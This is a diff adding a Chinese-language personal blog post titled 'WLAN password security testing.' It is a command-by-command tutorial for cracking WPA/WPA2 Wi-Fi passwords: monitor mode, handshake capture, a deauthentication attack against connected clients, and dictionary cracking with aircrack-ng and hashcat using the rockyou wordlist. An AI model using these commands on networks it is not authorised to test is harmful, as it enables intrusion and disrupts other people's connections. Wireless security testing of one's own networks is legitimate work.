@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Armin">
+
+
+
+
+
+<title>wlan密码安全测试 | 星辉的博客</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">⭐辉的博客</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">⭐辉的博客</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">wlan密码安全测试</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Armin</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">一月 31, 2022&nbsp;&nbsp;15:38:06</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ol>
+<li>Kali Linux（推荐），该系统预装了用到的所有工具，或者其它基于debian的GUN/Linux也是可以的，需要手动安装<a target="_blank" rel="noopener" href="http://aircrack-ng.org/">Aircrack-ng</a>,<code>sudo apt-get install aircrack-ng</code><blockquote>
+<p>为了方便可以将系统安装到优盘（<a target="_blank" rel="noopener" href="https://www.kali.org/docs/usb/live-usb-install-with-windows/">安装文档</a>），奇怪的是，使用官方推荐的工具<a target="_blank" rel="noopener" href="https://github.com/balena-io/etcher/releases">etcher</a>、<a target="_blank" rel="noopener" href="https://rufus.ie/zh/">rufus</a>制作的优盘，在UEFI+GPT方式的引导下并没有成功进入系统，后来使用了Win32DiskImager并关闭了BIOS的安全启动才成功进入系统。</p>
+</blockquote>
+</li>
+</ol>
+<p><strong>注意：</strong>使用Win32DiskImager制作启动盘会对优盘的容量有折损，建议使用闲置的优盘。</p>
+<ol start="2">
+<li>一个支持<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Monitor_mode">监听模式</a>的无线网卡（一般笔记本自带的就可以），台式机的话可以买个外置无线网卡，<a target="_blank" rel="noopener" href="http://www.wirelesshack.org/best-kali-linux-compatible-usb-adapter-dongles-2016.html">支持的设备</a></li>
+</ol>
+<h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><h3 id="开启网卡监听"><a href="#开启网卡监听" class="headerlink" title="开启网卡监听"></a>开启网卡监听</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 列出支持Monitor_mode的接口</span><br><span class="line">airmon-ng</span><br><span class="line"># 开启网卡监听模式</span><br><span class="line">airmon-ng start wlan0</span><br><span class="line"># 查看处于监听的接口</span><br><span class="line">iwconfig</span><br></pre></td></tr></table></figure>
+
+<h3 id="扫描你要破解的网络"><a href="#扫描你要破解的网络" class="headerlink" title="扫描你要破解的网络"></a>扫描你要破解的网络</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan0mon</span><br></pre></td></tr></table></figure>
+<p><code>ctrl+c</code>退出扫描，记下你要破解无线的BSSID MAC地址和channel，后面会用到</p>
+<h3 id="捕获握手包"><a href="#捕获握手包" class="headerlink" title="捕获握手包"></a>捕获握手包</h3><p>WAP/WAP2是用<a target="_blank" rel="noopener" href="https://security.stackexchange.com/questions/17767/four-way-handshake-in-wpa-personal-wpa-psk">4-way handshake</a>验证网络设备的，我们需要捕获到其中的一次握手来破解密码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># replace -c and --bssid values with the values of your target network</span><br><span class="line"># -w specifies the directory where we will save the packet capture</span><br><span class="line">airodump-ng -c 3 --bssid 9C:5C:8E:C9:AB:C0 -w handshake mon0</span><br></pre></td></tr></table></figure>
+<p>当屏幕上出现类似<code>[ WPA handshake: bc:d3:c9:ef:d2:67</code>的字符串时，说明捕获成功，此时会在当前目录下生成handshake-01.cap文件，我们需要这个文件进行破解。</p>
+<blockquote>
+<p>此方式需要等有设备连接时才会捕获到握手包，但是我们可以通过以下方式，来促使这一过程的完成</p>
+</blockquote>
+<h3 id="Deauth-Attack"><a href="#Deauth-Attack" class="headerlink" title="Deauth Attack"></a>Deauth Attack</h3><p>可以伪造一个forged deauthentication packets取消验证的数据包发给终端。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># -0 2 specifies we would like to send 2 deauth packets. Increase this number</span><br><span class="line"># if need be with the risk of noticeably interrupting client network activity</span><br><span class="line"># -a is the MAC of the access point</span><br><span class="line"># -c is the MAC of the client</span><br><span class="line">aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0</span><br><span class="line"></span><br><span class="line"># not all clients respect broadcast deauths though</span><br><span class="line">aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 mon0</span><br></pre></td></tr></table></figure>
+
+<h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># download the 134MB rockyou dictionary file</span><br><span class="line">curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt</span><br><span class="line"># -a2 specifies WPA2, -b is the BSSID, -w is the wordfile</span><br><span class="line">aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt hackme.cap</span><br></pre></td></tr></table></figure>
+<p>等待出现<code>KEY FOUND!</code>时，则成功解密</p>
+<h3 id="hashcat解密"><a href="#hashcat解密" class="headerlink" title="hashcat解密"></a>hashcat解密</h3><p><a target="_blank" rel="noopener" href="https://github.com/hashcat/hashcat">hashcat</a>是世界上最快，最先进的密码恢复实用程序，支持五种独特的攻击模式，适用于300多种高度优化的哈希算法。hashcat 目前在 Linux、Windows 和 macOS 上支持 CPU、GPU 和其他硬件加速器，并具有帮助启用分布式密码破解的功能。</p>
+<ul>
+<li>通过<a target="_blank" rel="noopener" href="https://hashcat.net/cap2hccapx/">cap2hccapx</a>将cap文件转化为hashcat需要的格式</li>
+<li>通过<a target="_blank" rel="noopener" href="https://hashcat.net/wiki/doku.php?id=example_hashes">example_hashes</a>,搜索wap加密的Hash-Mode</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># -m 指定hash-mode -a 指定攻击模式</span><br><span class="line">hashcat -m 22000 -a 0 $&#123;破解文件&#125; $&#123;字典&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p><a target="_blank" rel="noopener" href="https://github.com/brannondorsey/wifi-cracking">地址</a></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Armin</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://preferman.github.io/2022/01/31/wlan%E5%AF%86%E7%A0%81%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/">http://preferman.github.io/2022/01/31/wlan%E5%AF%86%E7%A0%81%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/</a></span>
+                    </p>
+                
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2022/02/14/Oracle%20Cloud%E9%85%8D%E7%BD%AE/">Oracle Cloud配置</a>
+            
+            
+            <a class="next" rel="next" href="/2021/11/28/docker/">Docker</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Armin | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
